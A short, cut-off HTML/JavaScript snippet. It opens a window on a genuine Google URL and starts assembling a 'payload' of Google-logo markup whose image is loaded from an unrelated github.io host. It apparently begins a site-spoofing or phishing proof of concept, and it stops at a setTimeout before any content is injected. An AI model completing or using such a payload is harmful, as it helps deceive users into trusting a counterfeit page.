<html>
<body>

  <script>

      let win = window.open("https://www.google.com/gen_204", "_blank");

      let payload = `
      <div style="text-align:center; padding-top:20px">
          <img src="https://umar1105.github.io/602651.jpg"
          alt="Google Logo" width="160" height="56">
      </div>

      setTimeout(() => {
